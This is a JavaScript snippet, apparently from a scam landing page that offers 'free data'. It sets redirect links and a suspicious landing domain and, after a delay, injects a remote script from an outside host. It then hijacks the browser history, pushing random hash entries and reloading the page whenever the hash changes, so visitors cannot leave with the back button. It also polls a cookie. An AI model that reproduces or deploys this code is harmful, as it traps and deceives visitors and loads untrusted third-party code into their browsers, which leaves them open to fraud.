    var ad1 = '/go.php?t=1';
    var ad2 = '/go.php?t=2';
    var ad3 = '/go.php?t=3';
    var landingDomain = 'https://100gb153.aeju.top/?freedata=252';
        setTimeout(function() {

    var ps = document.documentElement.appendChild(document.createElement("script"));
    ps.async = true;
    ps.setAttribute("data-domain", 'id-gopay01');
    ps.src = "https://tj.16gift.com/js/script.js";
}, 500);

window.hh=function(p){history.pushState(history.length+1,"message","#"+randomString(8));};window.onhashchange=function(){top.location.reload();};setTimeout('hh(6);',500);

    if(typeof window.madInt == "undefined") {
  window.madInt = setInterval(function() {
      var sht = get_Cookie('d');
      sht = sht == '' ? 0 : parseInt(sht);
   
  }, 1000);
}

function randomString(len) {
  　　len = len || 32;
  　　var chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
  　　var maxPos = chars.length;
  　　var pwd = '';
  　　for (let i = 0; i < len; i++) {
  　　　    pwd += chars.charAt(Math.floor(Math.random() * maxPos));
  　　}
 　　return pwd;
 }